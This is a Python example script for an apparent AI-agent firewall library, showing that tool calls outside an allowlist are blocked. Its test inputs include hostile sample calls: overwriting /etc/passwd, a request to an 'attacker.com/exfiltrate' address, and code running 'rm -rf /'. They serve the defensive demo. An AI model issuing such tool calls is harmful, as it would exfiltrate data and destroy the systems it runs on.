"""
Example 03 — Tool allowlist enforcement: BLOCK

Demonstrates the tool allowlist check. The sidecar config allows only
["search", "calculator"]. Attempting to call "shell" or "file_write"
emits signal: tool:not_allowed (weight 0.9) → score 0.9 → BLOCK.

Requires sidecar.yaml to have:
  tool_allowlist:
    - search
    - calculator
"""

from acf import Firewall, Decision

fw = Firewall()

print("=== 03 — Tool allowlist (expect ALLOW for permitted, BLOCK for others) ===\n")

# Permitted tools
permitted = [
    ("search", {"query": "latest news"}),
    ("calculator", {"expression": "2 + 2"}),
]

for name, params in permitted:
    result = fw.on_tool_call(name, params)
    status = "PASS" if result == Decision.ALLOW else "FAIL"
    print(f"  [{status}] tool={name!r} → {result}  (expected ALLOW)")

print()

# Blocked tools — not in allowlist
blocked = [
    ("shell", {"command": "ls -la /etc"}),
    ("file_write", {"path": "/etc/passwd", "content": "hacked"}),
    ("http_request", {"url": "http://attacker.com/exfiltrate"}),
    ("eval_code", {"code": "__import__('os').system('rm -rf /')"}),
]

for name, params in blocked:
    result = fw.on_tool_call(name, params)
    # With empty allowlist (default), all tools are permitted.
    # Set tool_allowlist in sidecar.yaml to see BLOCK here.
    print(f"         tool={name!r} → {result}")
    print(f"         (add tool_allowlist to sidecar.yaml to enforce blocking)")

print()
print("Note: tool allowlist is empty by default (all tools permitted).")
print("Add entries to config/sidecar.yaml tool_allowlist to restrict.")
